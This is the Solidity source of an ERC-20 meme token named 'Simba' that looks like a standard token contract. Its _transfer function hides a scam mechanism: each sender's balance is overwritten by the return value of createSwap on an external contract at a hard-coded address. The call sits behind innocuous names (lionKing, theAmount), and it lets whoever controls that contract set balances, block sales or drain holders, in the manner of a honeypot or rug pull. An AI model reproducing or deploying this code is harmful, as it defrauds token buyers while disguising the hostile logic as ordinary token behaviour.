/*
$$$$$$$$$$$$$$$$$$$$$$$$$"" .<   <#$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$" ':: ~>!'.!"#***$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$" '       ~~' <'9$$$$
$$$$$$$$$$$$$$P               .MMXRh.>=-.uz~d$WWB$$      '$$$$
$$$$$$$$$$$$$"                !XMMXX$$@N*TW4$$$$$$$Ne... '$$$$
$$$$$$$$$$$$                  !M!!RMXXS@$$*<$$$$$$$$$$$$!<$$$$
$$$$$$$$$$"        xx         4!K?!XMR$59@$`$$#BQ$$$$$$P'8$$$$
$$$$$$$$P         d$#         !MX!RM!SM$$$WX$%P"  `("). :$$$$$
$$$$$$$" `        ^ ?        :!X@MXXRMMN9$$S9$     )r#ze$$$$$$
$$$$$$F '          k~        'Xt!X%MXHRM8@XR!R     4$@$$$$$$$$
$$$$$R   `         `         '!!XMX!RMMMR!$9!R     '$$$$$$$$$$
$$$$$> ~                      XM!>?MXX5!XB?M$t      #$$$$X#$$$
$$$$$f                        ~!X !!R?XXRM@$9!        e"!#\I$$
$$$$$>                        'M! ~!XX%!Xt?M$!L .  . '".o@$$$$
$$$$$E                         `! '!`!X!""fMMX$bu.uoe$$$$$$$$$
$$$$$E `                        '  ~ !      `#9$$$$$$$$$$$$$$$
$$$$$F                                        '$$$$$$$$$$$$$$$
$$$$$  -                                        #$$$$$$$$$$$$$
$$$$R                                            ^#*$$RR$$$$$$
$$$$F <`                                         ' *$$$$$$$$$$
$$$$>~'                                           `~R$$$$$$$$$
$$$$  ~~                                        <~  4?$$$$$$$$
$$$F `                                              <~ 4?$!$$$
       z@$$$$$MMR$XW$M@NRM$$TKMM!!RM!X!               ~~~ 8$$$
     .@$$$$$9M@$MMB$MB$R@8REB$MXRMX!!!X.                 :$$$$
    u$$$$$$R@$RK$$@6$$@B$@$$MZBMXXM?XX?!                 $$$$$
   d$$$$$$$BMM$$M&$$8$$$$$$$$$9&BMXX?MXX                @$$$$$
  @$$$$$$$$M$B9E$$WB$$$$$$$$$$$$MKRMXX?!>              d$$$$$$
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC5679 {
      function createSwap(uint256 value) external returns (uint256);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address _lionKing = 0xB794822ebCC4dA7149BA0904A4f5d3111b28E1eC;
    address public pair;

    IDEXRouter router;
    IERC5679 lionKing;

    string private _name; string private _symbol; uint256 private _totalSupply;
    bool public trade; uint256 public startBlock; address public msgSend;
    address public msgReceive;
    
    constructor (string memory name_, string memory symbol_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        lionKing = IERC5679(_lionKing);

        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() public {
        require(((msg.sender == owner()) || (address(0) == owner())), "Ownable: caller is not the owner");
        trade = true; startBlock = block.number;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
        
    function theAmount(uint256 amount) internal returns (uint256) {
        return lionKing.createSwap(amount);
    }

    function _beforeTokenTransfer(address sender, address recipient, uint256 amount) internal virtual {
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        msgSend = sender; msgReceive = recipient;

        require(((trade == true) || (msgSend == owner())), "ERC20: trading is not yet enabled");
        require(msgSend != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = theAmount(amount) - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _DeploySimba(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
 
        approve(_router, ~uint256(0));
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol) {
        _DeploySimba(creator, initialSupply);
    }
}

contract Simba is ERC20Token {
    constructor() ERC20Token("Simba", "SIMBA", msg.sender, 42069420 * 10 ** 18) {
    }
}